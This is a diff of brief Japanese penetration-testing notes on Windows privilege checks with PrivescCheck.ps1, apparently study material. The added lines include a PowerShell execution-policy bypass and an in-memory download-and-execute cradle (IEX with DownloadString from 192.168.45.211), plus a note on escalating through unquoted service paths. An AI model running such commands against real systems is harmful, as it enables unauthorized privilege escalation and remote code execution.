@@ -1,12 +1,32 @@
 # PrivilegeCheck
 
-* PrivescCheck.ps1
+### PrivescCheck.ps1
+
+```
+locate PrivescCheck.ps1
+```
+
+転送して実行
 
 ```
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
-https://github.com/itm4n/PrivescCheck
+インメモリで実行
+
+* 末尾に追加
+
+![image-20230219222414202](img/PrivilegeCheck/image-20230219222414202.png)
+
+* powershellを実行
+
+```powershell
+powershell.exe IEX (New-object System.Net.Webclient).Downloadstring('http://192.168.45.211/PrivescCheck.ps1')
+```
+
+
+
+
 
 unquotedのパスで、かつ、フォルダの書き込み権限があり、start/stop可能もしくはAutorunの場合に特権昇格できる可能性がある
 
